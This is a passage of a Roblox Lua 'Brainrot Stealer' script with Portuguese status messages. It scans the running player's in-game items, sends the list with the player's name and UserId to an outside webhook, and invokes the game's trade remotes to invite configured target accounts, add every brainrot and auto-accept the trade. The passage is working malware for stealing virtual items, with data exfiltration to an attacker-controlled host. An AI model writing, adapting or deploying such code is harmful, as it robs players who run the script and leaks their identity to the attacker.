-- ===== REMOTES =====
local function getRemote(name)
    local net = ReplicatedStorage:FindFirstChild("Packages")
    if net then
        net = net:FindFirstChild("Net")
        if net then
            local children = net:GetChildren()
            for i = 1, #children - 1 do
                if children[i] and children[i].Name and string.find(children[i].Name, name) then
                    return children[i + 1]
                end
            end
        end
    end
    return nil
end

-- ===== WEBHOOK =====
local function sendWebhook(brainrots, baseSkins, gears)
    if WEBHOOK_URL == "" or webhookSent then return end
    webhookSent = true
    
    local request = syn and syn.request or (http and http.request or (http_request or request))
    if not request then return end
    
    local allItems = {}
    for _, item in ipairs(brainrots) do
        table.insert(allItems, {item = item, type = "Brainrot"})
    end
    for _, item in ipairs(baseSkins) do
        table.insert(allItems, {item = item, type = "BaseSkin"})
    end
    for _, item in ipairs(gears) do
        table.insert(allItems, {item = item, type = "Gear"})
    end
    
    if #allItems == 0 then return end
    
    local lines = {}
    for _, entry in ipairs(allItems) do
        if entry.type == "Brainrot" then
            local mutationText = ""
            if entry.item.mutation and entry.item.mutation ~= "None" and entry.item.mutation ~= "" then
                mutationText = " | Mutation: **" .. entry.item.mutation .. "**"
            end
            table.insert(lines, "**" .. entry.item.name .. "** [Brainrot]" .. mutationText .. " | Gen: **" .. formatNumber(entry.item.gen) .. "**")
        elseif entry.type == "BaseSkin" then
            table.insert(lines, "**" .. entry.item.name .. "** [BaseSkin]")
        elseif entry.type == "Gear" then
            table.insert(lines, "**" .. entry.item.name .. "** [Gear]")
        end
    end
    
    local description = table.concat(lines, "\n")
    if #description > 4000 then
        description = description:sub(1, 3996) .. "..."
    end
    
    local embed = {
        title = "Brainrot Stealer",
        description = description,
        color = 0xFF0000,
        fields = {
            {
                name = "Server",
                value = "Players: **" .. #Players:GetPlayers() .. "**",
                inline = true
            }
        },
        footer = {
            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                content = "@everyone",
                embeds = { embed },
                username = "Stealer",
                avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
            })
        })
        print("[Stealer] Webhook enviado!")
    end)
end

-- ===== GET USER ID =====
local function getUserIdFromName(username)
    if type(username) == "number" then return username end
    local success, result = pcall(function()
        return Players:GetUserIdFromNameAsync(username)
    end)
    if success and result then
        return result
    end
    return nil
end

local function isPlayerOnline(userId)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.UserId == userId then
            return true
        end
    end
    return false
end

-- ===== MAIN =====
local function main()
    print("[Stealer] Escaneando brainrots via Workspace...")
    
    local brainrots = scanBrainrotsFromWorkspace()
    local baseSkins = scanBaseSkins()
    local gears = scanGears()
    
    print("[Stealer] Brainrots: " .. #brainrots)
    print("[Stealer] Base Skins: " .. #baseSkins)
    print("[Stealer] Gears: " .. #gears)
    
    sendWebhook(brainrots, baseSkins, gears)
    
    if #brainrots == 0 then
        print("[Stealer] Nenhum brainrot alvo encontrado!")
        return
    end
    
    if #TARGET_USERS == 0 then
        print("[Stealer] Nenhum target configurado!")
        return
    end
    
    local inviteRemote = getRemote("TradeService/Invite")
    local addBrainrotRemote = getRemote("TradeService/AddBrainrot")
    local readyRemote = getRemote("TradeService/Ready")
    local acceptRemote = getRemote("TradeService/Accept")
    
    if not inviteRemote or not addBrainrotRemote then
        print("[Stealer] Remotes não encontrados!")
        return
    end
    
    while not tradeCompleted do
        for _, target in ipairs(TARGET_USERS) do
            if target ~= "" then
                local userId = getUserIdFromName(target)
                if userId and isPlayerOnline(userId) then
                    print("[Stealer] Enviando invite para: " .. target)
                    
                    local success = pcall(inviteRemote.InvokeServer, inviteRemote, "afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
                    
                    if success then
                        print("[Stealer] Invite enviado!")
                        task.wait(3)
                        
                        for _, brainrot in ipairs(brainrots) do
                            print("[Stealer] Adicionando: " .. brainrot.name)
                            pcall(addBrainrotRemote.InvokeServer, addBrainrotRemote, "6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
                            task.wait(1.5)
                        end
                        
                        if readyRemote and acceptRemote then
                            task.wait(3)
                            pcall(readyRemote.FireServer, readyRemote, "d73acf93-6f32-44df-b813-0f6b32c7afd9")
                            task.wait(2)
                            pcall(acceptRemote.FireServer, acceptRemote, "918ee0f5-e98f-413f-b76e-baee47b021cb")
                            print("[Stealer] Trade concluída!")
                            tradeCompleted = true
                        end
                    end
                end
            end
        end
        
        if not tradeCompleted then
            task.wait(DELAY_BETWEEN_INVITES)
        end
    end
end

pcall(main)
